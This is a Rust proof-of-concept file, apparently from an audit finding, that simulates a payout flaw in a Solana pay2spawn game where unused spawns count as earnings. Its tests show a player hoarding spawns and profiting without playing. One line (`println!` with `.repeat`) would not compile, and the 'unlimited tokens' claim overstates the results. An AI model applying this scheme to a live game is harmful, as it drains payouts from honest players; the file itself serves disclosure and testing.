// VUL-002: Pay2Spawn Earnings Exploitation - Proof of Concept
// This PoC demonstrates how players can generate unlimited tokens through spawn hoarding

use anchor_lang::prelude::*;
use anchor_spl::token::{self, Token, TokenAccount, Transfer};
use std::collections::HashMap;

/// Simulates the vulnerable pay2spawn earnings calculation
/// Based on actual code from distribute_winnings.rs:39 and state.rs:144-148
pub struct Pay2SpawnExploit {
    pub session_bet: u64,
    pub players: HashMap<Pubkey, PlayerStats>,
}

#[derive(Debug, Clone)]
pub struct PlayerStats {
    pub kills: u16,
    pub spawns: u16,
    pub total_paid: u64,
}

impl Pay2SpawnExploit {
    pub fn new(session_bet: u64) -> Self {
        Self {
            session_bet,
            players: HashMap::new(),
        }
    }

    /// Simulates player joining pay2spawn game with initial spawns
    pub fn join_game(&mut self, player: Pubkey, initial_spawns: u16) -> u64 {
        let cost = self.session_bet;
        self.players.insert(player, PlayerStats {
            kills: 0,
            spawns: initial_spawns,
            total_paid: cost,
        });
        println!("Player {} joined with {} spawns for {} tokens",
                player.to_string()[..8].to_string(), initial_spawns, cost / 1_000_000);
        cost
    }

    /// Simulates buying additional spawns (vulnerable function)
    /// Based on pay_to_spawn.rs:33 and state.rs:186
    pub fn buy_spawns(&mut self, player: Pubkey, spawn_rounds: u16) -> u64 {
        let cost_per_round = self.session_bet;
        let total_cost = cost_per_round * spawn_rounds as u64;
        let spawns_gained = spawn_rounds * 10; // 10 spawns per purchase

        if let Some(stats) = self.players.get_mut(&player) {
            stats.spawns += spawns_gained;
            stats.total_paid += total_cost;
            println!("Player {} bought {} spawn rounds ({} spawns) for {} tokens",
                    player.to_string()[..8].to_string(),
                    spawn_rounds,
                    spawns_gained,
                    total_cost / 1_000_000);
        }
        total_cost
    }

    /// Simulates player getting kills
    pub fn record_kill(&mut self, killer: Pubkey) {
        if let Some(stats) = self.players.get_mut(&killer) {
            stats.kills += 1;
            println!("Player {} got a kill! Total kills: {}",
                    killer.to_string()[..8].to_string(), stats.kills);
        }
    }

    /// VULNERABLE EARNINGS CALCULATION
    /// Based on distribute_winnings.rs:39 and state.rs:144-148
    /// BUG: Players get paid for UNUSED spawns!
    pub fn calculate_earnings(&self, player: Pubkey) -> u64 {
        if let Some(stats) = self.players.get(&player) {
            // VULNERABLE CODE: kills + spawns (should be kills - used_spawns)
            let kills_and_spawns = stats.kills + stats.spawns;
            let earnings = kills_and_spawns as u64 * self.session_bet / 10;

            println!("=== EARNINGS CALCULATION for {} ===",
                    player.to_string()[..8].to_string());
            println!("Kills: {}", stats.kills);
            println!("Unused spawns: {} (SHOULD NOT COUNT!)", stats.spawns);
            println!("Total 'performance': {} (kills + unused spawns)", kills_and_spawns);
            println!("Earnings: {} tokens", earnings / 1_000_000);
            println!("Total paid: {} tokens", stats.total_paid / 1_000_000);
            println!("Profit/Loss: {} tokens",
                    (earnings as i64 - stats.total_paid as i64) / 1_000_000);

            earnings
        } else {
            0
        }
    }

    /// Demonstrates the exploit scenario
    pub fn run_exploit_scenario(&mut self) {
        println!("\n🚨 VUL-002: Pay2Spawn Earnings Exploitation PoC");
        println!("=".repeat(60));

        let attacker = Pubkey::new_unique();
        let honest_player = Pubkey::new_unique();

        // Scenario 1: Honest player behavior
        println!("\n--- Honest Player Behavior ---");
        self.join_game(honest_player, 10);
        self.record_kill(honest_player);
        self.record_kill(honest_player);
        self.record_kill(honest_player);
        // Honest player uses spawns through combat, let's say has 7 left
        self.players.get_mut(&honest_player).unwrap().spawns = 7;

        let honest_earnings = self.calculate_earnings(honest_player);

        // Scenario 2: Attacker behavior - spawn hoarding
        println!("\n--- Attacker Behavior: Spawn Hoarding ---");
        self.join_game(attacker, 10);

        // Attacker buys multiple spawn rounds but avoids combat
        self.buy_spawns(attacker, 5); // 5 more rounds = 50 spawns
        self.buy_spawns(attacker, 3); // 3 more rounds = 30 spawns
        // Total: 10 + 50 + 30 = 90 unused spawns

        // Attacker gets minimal kills but hoards all spawns
        self.record_kill(attacker);
        // Spawns remain at 90 (unused)

        let attacker_earnings = self.calculate_earnings(attacker);

        println!("\n🎯 EXPLOIT RESULTS:");
        println!("Honest player: {} tokens profit",
                (honest_earnings as i64 - 100_000_000) / 1_000_000);
        println!("Attacker: {} tokens profit",
                (attacker_earnings as i64 - self.players.get(&attacker).unwrap().total_paid as i64) / 1_000_000);

        if attacker_earnings > self.players.get(&attacker).unwrap().total_paid {
            println!("💀 EXPLOIT SUCCESSFUL: Attacker profits from unused spawns!");
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pay2spawn_exploit() {
        let session_bet = 100_000_000; // 100 tokens
        let mut exploit = Pay2SpawnExploit::new(session_bet);

        exploit.run_exploit_scenario();

        // Verify the vulnerability exists
        let attacker = Pubkey::new_unique();
        exploit.join_game(attacker, 10);
        exploit.buy_spawns(attacker, 5); // Buy 50 more spawns

        // Attacker avoids combat (0 kills, 60 unused spawns)
        let earnings = exploit.calculate_earnings(attacker);
        let total_paid = exploit.players.get(&attacker).unwrap().total_paid;

        // With 0 kills + 60 spawns = 60 * 100 / 10 = 600 tokens earned
        // Total paid = 100 + 500 = 600 tokens
        // Result: Break even for doing nothing!
        assert_eq!(earnings, total_paid);

        println!("✅ Vulnerability confirmed: Players break even by hoarding spawns");
    }

    #[test]
    fn test_spawn_hoarding_profit() {
        let session_bet = 100_000_000; // 100 tokens
        let mut exploit = Pay2SpawnExploit::new(session_bet);

        let attacker = Pubkey::new_unique();
        exploit.join_game(attacker, 10);
        exploit.buy_spawns(attacker, 10); // Buy 100 more spawns

        // Attacker gets some kills while hoarding spawns
        exploit.record_kill(attacker);
        exploit.record_kill(attacker);
        exploit.record_kill(attacker);
        // 3 kills + 110 spawns = 113 * 100 / 10 = 1,130 tokens

        let earnings = exploit.calculate_earnings(attacker);
        let total_paid = exploit.players.get(&attacker).unwrap().total_paid;

        println!("Earnings: {} tokens", earnings / 1_000_000);
        println!("Total paid: {} tokens", total_paid / 1_000_000);
        println!("Profit: {} tokens", (earnings as i64 - total_paid as i64) / 1_000_000);

        assert!(earnings > total_paid, "Attacker should profit from spawn hoarding");

        println!("✅ Exploit confirmed: Spawn hoarding generates profit");
    }

    /// Demonstrates the correct calculation vs vulnerable calculation
    #[test]
    fn test_correct_vs_vulnerable_calculation() {
        let session_bet = 100_000_000;

        // Player stats: 5 kills, 20 unused spawns, paid 700 tokens total
        let kills = 5u16;
        let unused_spawns = 20u16;
        let total_paid = 700_000_000u64;

        // VULNERABLE CALCULATION (current code)
        let vulnerable_earnings = (kills + unused_spawns) as u64 * session_bet / 10;

        // CORRECT CALCULATION (should only count kills)
        let correct_earnings = kills as u64 * session_bet / 10;

        println!("Player: {} kills, {} unused spawns, paid {} tokens",
                kills, unused_spawns, total_paid / 1_000_000);
        println!("Vulnerable calculation: {} tokens", vulnerable_earnings / 1_000_000);
        println!("Correct calculation: {} tokens", correct_earnings / 1_000_000);
        println!("Difference: {} tokens", (vulnerable_earnings - correct_earnings) / 1_000_000);

        assert_eq!(vulnerable_earnings, 250_000_000); // 250 tokens
        assert_eq!(correct_earnings, 50_000_000);     // 50 tokens
        assert_eq!(vulnerable_earnings - correct_earnings, 200_000_000); // 200 token overpayment

        println!("✅ Vulnerability quantified: {} token overpayment for unused spawns",
                (vulnerable_earnings - correct_earnings) / 1_000_000);
    }
}

/// Integration test simulating actual Solana program interaction
#[cfg(test)]
mod integration_tests {
    use super::*;

    #[test]
    fn test_realistic_game_scenario() {
        let session_bet = 50_000_000; // 50 tokens (realistic bet size)
        let mut game = Pay2SpawnExploit::new(session_bet);

        println!("\n🎮 REALISTIC GAME SCENARIO");
        println!("Session bet: {} tokens", session_bet / 1_000_000);

        // Multiple players join
        let alice = Pubkey::new_unique();
        let bob = Pubkey::new_unique();
        let charlie_attacker = Pubkey::new_unique();

        // Normal players
        game.join_game(alice, 10);
        game.join_game(bob, 10);

        // Attacker joins and immediately buys massive spawns
        game.join_game(charlie_attacker, 10);
        game.buy_spawns(charlie_attacker, 20); // 200 additional spawns!

        // Game plays out - normal players get kills and use spawns
        game.record_kill(alice);
        game.record_kill(alice);
        game.record_kill(bob);
        game.players.get_mut(&alice).unwrap().spawns = 8; // Used 2 spawns
        game.players.get_mut(&bob).unwrap().spawns = 9;   // Used 1 spawn

        // Attacker avoids combat entirely, hoards all spawns
        // 0 kills, 210 unused spawns

        let alice_earnings = game.calculate_earnings(alice);
        let bob_earnings = game.calculate_earnings(bob);
        let attacker_earnings = game.calculate_earnings(charlie_attacker);

        println!("\n📊 FINAL RESULTS:");
        println!("Alice (active player): {} token profit",
                (alice_earnings as i64 - 50_000_000) / 1_000_000);
        println!("Bob (active player): {} token profit",
                (bob_earnings as i64 - 50_000_000) / 1_000_000);
        println!("Charlie (attacker): {} token profit",
                (attacker_earnings as i64 - game.players.get(&charlie_attacker).unwrap().total_paid as i64) / 1_000_000);

        // Attacker should break even or profit despite not playing
        assert!(attacker_earnings >= game.players.get(&charlie_attacker).unwrap().total_paid / 2);

        println!("💀 VULNERABILITY IMPACT: Attacker can profit without meaningful gameplay!");
    }
}